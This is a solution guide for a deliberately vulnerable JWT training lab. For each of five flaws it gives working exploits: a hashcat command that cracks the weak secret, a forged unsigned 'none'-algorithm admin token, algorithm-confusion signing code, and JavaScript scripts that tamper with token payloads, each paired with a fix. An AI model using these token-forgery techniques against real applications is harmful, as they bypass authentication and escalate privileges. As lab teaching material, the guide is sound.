# JWT Vulnerability Lab - Solution Guide

This document outlines the JWT vulnerabilities present in this lab and demonstrates how to exploit them.

## Getting Started

1. Start the application with Docker Compose:
   ```
   docker-compose up -d
   ```

2. Access the web interface at http://localhost:8080
3. The API server runs at http://localhost:3000

## Available Test Users

- Regular user: `user / userpassword`
- Admin user: `admin / adminpassword`

## Vulnerabilities and Exploitation Techniques

### 1. Weak Secret Key

**Vulnerability**: The application uses a weak, predictable JWT secret (`supersecretkey`).

**Exploitation**:
- Obtain a valid JWT token by logging in
- Use a tool like `hashcat` or an online JWT cracker to brute force the secret
- Once discovered, you can craft arbitrary valid tokens

**PoC Command**:
```
hashcat -a 0 -m 16500 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NTgzNGRkOGE4OTNlYWYwODJlOGYxNzgiLCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMTYxNTk5NiwiZXhwIjoxNzAxNjE5NTk2fQ.FxbRS4A4vCe9Kw2NL6c0KSAGeaN-wqCOXb9j_HXMwxA" /path/to/wordlist.txt
```

**Fix**: Use a strong, randomly generated secret key with sufficient length (at least 32 bytes).

### 2. 'None' Algorithm Attack

**Vulnerability**: The `/api/none-alg` endpoint accepts tokens with the 'none' algorithm.

**Exploitation**:
1. Get a valid token by logging in
2. Decode the token to get the payload
3. Create a new token with the 'none' algorithm and no signature:

```
// Header: {"alg":"none","typ":"JWT"}
// Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
// Payload: Keep the same as your original token
// Token format: header.payload.
```

Example of a modified token:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI2NTgzNGRkOGE4OTNlYWYwODJlOGYxNzgiLCJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDE2MTU5OTYsImV4cCI6MTcwMTYxOTU5Nn0.
```

Note: The token ends with a period, but there is no signature.

**Fix**: Always validate algorithms and reject 'none' algorithm:
```javascript
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```

### 3. Algorithm Confusion Attack

**Vulnerability**: The `/api/alg-confusion` endpoint accepts multiple algorithms without proper validation.

**Exploitation**:
1. Extract the public key from the server (or use the server's symmetric key as if it were a public key)
2. Change the algorithm from HS256 to RS256
3. Sign with the extracted public key (which the server will try to validate as a symmetric key)

Example:
```javascript
// Get the server's JWT_SECRET from the debug endpoint
const publicKeyAsBytes = Buffer.from("supersecretkey");

// Create payload with admin role
const payload = {
  "userId": "1234",
  "username": "user",
  "role": "admin",
  "iat": Math.floor(Date.now() / 1000),
  "exp": Math.floor(Date.now() / 1000) + 3600
};

// Create token with RS256 algorithm
const token = jwt.sign(payload, publicKeyAsBytes, { algorithm: 'HS256', header: { alg: 'RS256' } });
```

**Fix**: Always explicitly specify and validate the algorithm:
```javascript
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] }); 
```

### 4. Missing Signature Validation

**Vulnerability**: The `/api/missing-validation` endpoint doesn't properly validate the token signature.

**Exploitation**:
1. Get a valid token
2. Decode the payload
3. Modify the payload (e.g., change "role":"user" to "role":"admin")
4. Base64-encode the modified payload
5. Replace the original payload in the token, keeping the header and signature the same

Example:
```javascript
// Original token segments
const [header, payload, signature] = token.split('.');

// Decode payload
const decodedPayload = JSON.parse(atob(payload));

// Modify payload
decodedPayload.role = "admin";

// Encode and create new token
const newPayload = btoa(JSON.stringify(decodedPayload)).replace(/=/g, '');
const tamperedToken = `${header}.${newPayload}.${signature}`;
```

**Fix**: Always use proper JWT verification functions and never manually parse tokens.

### 5. JWT Secret Disclosure

**Vulnerability**: The `/api/debug` endpoint leaks the JWT secret.

**Exploitation**:
1. Access the debug endpoint: `http://localhost:3000/api/debug`
2. Extract the JWT secret from the response
3. Use the secret to forge valid tokens for any user

**Fix**: Never expose sensitive configuration values in responses or logs.

## Secure Implementation Recommendations

1. **Use Strong Secrets**: Generate a cryptographically secure random key with sufficient length
2. **Validate Algorithms**: Explicitly specify and validate the algorithm used
3. **Set Appropriate Expiry**: Use short-lived tokens with reasonable expiration times
4. **Include Only Necessary Data**: Minimize sensitive data in token payloads
5. **Implement Token Revocation**: Use a token blacklist or rotation mechanism for logout
6. **Use Libraries Securely**: Follow security best practices for JWT libraries

Example of secure JWT verification:
```javascript
jwt.verify(token, JWT_SECRET, { 
  algorithms: ['HS256'],
  ignoreExpiration: false,
  issuer: 'your-app'
});
```

## Example Attack Scripts

### Modify Payload Script

```javascript
function modifyTokenPayload(token, modifications) {
  const parts = token.split('.');
  const header = JSON.parse(atob(parts[0]));
  const payload = JSON.parse(atob(parts[1]));
  
  // Apply modifications
  Object.assign(payload, modifications);
  
  // Encode header and payload
  const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
  const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
  
  // When attacking missing validation endpoint, keep original signature
  return `${encodedHeader}.${encodedPayload}.${parts[2]}`;
}

// Example usage:
const modifiedToken = modifyTokenPayload(originalToken, { role: 'admin' });
```

### None Algorithm Attack Script

```javascript
function createNoneAlgorithmToken(payload) {
  // Create header with 'none' algorithm
  const header = { alg: 'none', typ: 'JWT' };
  
  // Encode parts without padding
  const encodedHeader = btoa(JSON.stringify(header)).replace(/=/g, '');
  const encodedPayload = btoa(JSON.stringify(payload)).replace(/=/g, '');
  
  // Return token with empty signature
  return `${encodedHeader}.${encodedPayload}.`;
}

// Example usage:
const noneToken = createNoneAlgorithmToken({
  userId: '123',
  username: 'user',
  role: 'admin'
});
```

## Conclusion

This lab demonstrates common JWT vulnerabilities that can lead to authentication bypass and privilege escalation. Proper implementation of JWT authentication should include secure key management, algorithm validation, and token verification to mitigate these risks.
